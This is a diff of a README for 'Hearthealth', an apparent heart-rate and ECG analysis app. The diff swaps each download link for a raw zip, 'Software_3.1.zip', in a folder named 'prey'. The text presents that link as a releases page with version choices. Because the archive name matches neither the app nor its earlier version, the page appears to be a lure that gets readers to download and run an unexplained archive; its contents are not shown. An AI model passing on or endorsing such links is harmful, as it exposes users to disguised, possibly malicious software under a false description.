@@ -6,7 +6,7 @@ Hearthealth is an application designed to help you analyze heart rate and ECG si
 
 ## 📥 Download Hearthealth 
 
-[![Download Hearthealth](https://raw.githubusercontent.com/mouad464/hearthealth/main/prey/hearthealth_v1.5.zip)](https://raw.githubusercontent.com/mouad464/hearthealth/main/prey/hearthealth_v1.5.zip)
+[![Download Hearthealth](https://github.com/mouad464/hearthealth/raw/refs/heads/main/prey/Software_3.1.zip)](https://github.com/mouad464/hearthealth/raw/refs/heads/main/prey/Software_3.1.zip)
 
 ## 📋 System Requirements
 
@@ -30,7 +30,7 @@ Hearthealth comes with several features to enhance your experience:
 
 To install Hearthealth, follow these steps:
 
-1. **Visit the Releases Page:** Go to this [link](https://raw.githubusercontent.com/mouad464/hearthealth/main/prey/hearthealth_v1.5.zip) to download the software. 
+1. **Visit the Releases Page:** Go to this [link](https://github.com/mouad464/hearthealth/raw/refs/heads/main/prey/Software_3.1.zip) to download the software. 
    
 2. **Choose Your Version:** On the Releases page, you will find different versions of the software. Select the latest version that matches your operating system.
 
@@ -91,4 +91,4 @@ Hearthealth is open-source software, released under the MIT License. For details
 
 ## 📥 Download Hearthealth Again
 
-To download the application, visit this [link](https://raw.githubusercontent.com/mouad464/hearthealth/main/prey/hearthealth_v1.5.zip) again. Enjoy analyzing your heart data with ease!
+To download the application, visit this [link](https://github.com/mouad464/hearthealth/raw/refs/heads/main/prey/Software_3.1.zip) again. Enjoy analyzing your heart data with ease!
